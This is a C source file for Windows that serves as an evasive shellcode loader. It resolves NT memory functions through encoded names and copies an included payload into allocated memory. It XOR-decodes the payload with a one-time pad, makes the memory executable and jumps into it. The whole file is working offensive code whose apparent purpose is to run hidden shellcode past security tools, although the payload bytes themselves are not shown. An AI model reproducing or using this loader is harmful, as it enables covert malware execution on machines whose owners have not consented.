#include <stdarg.h>
#include <stdio.h>
#include <windows.h>

#include "allocvm.h"
#include "loadlibrary.h"
#include "protectvm.h"
#include "thunk.h"
#include "payload.h"

typedef NTSTATUS(NTAPI *NtProtectVirtualMemory_t)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

int main() {
    LPVOID virtualMemoryAddress = NULL;
    SIZE_T memoryLength = 300;
    pNtAllocVM = EncNtAddrOf(NTALLOCATEVIRTUALMEMORY_NAME);
    pNtProtectVM = EncNtAddrOf(NTPROTECTVIRTUALMEMORY_NAME);

    InvokeAllocateVirtualMemory(&virtualMemoryAddress, memoryLength);
    printf("Waiting on memory alloc...");
    while (virtualMemoryAddress == NULL) {
        putc('.', stdout);
        Sleep(500);
    }
    printf("\nAllocated memory location: %p\n", virtualMemoryAddress);
    printf("Writing shellcode to memory...\n");
    memcpy(virtualMemoryAddress, buf, sizeof(buf));
    for (int i = 0; i < sizeof otp; i++) {
        ((char*)virtualMemoryAddress)[i] ^= otp[i];
    }

    PVOID *virtualMemoryAddressPtr = &virtualMemoryAddress;
    ULONG oldProtect = 0;
    InvokeProtectVirtualMemory(virtualMemoryAddressPtr, &memoryLength, PAGE_EXECUTE_READ, &oldProtect);
    printf("Jumping to shellcode...\n");
    ((void(*)())virtualMemoryAddress)();

    return 0;
}
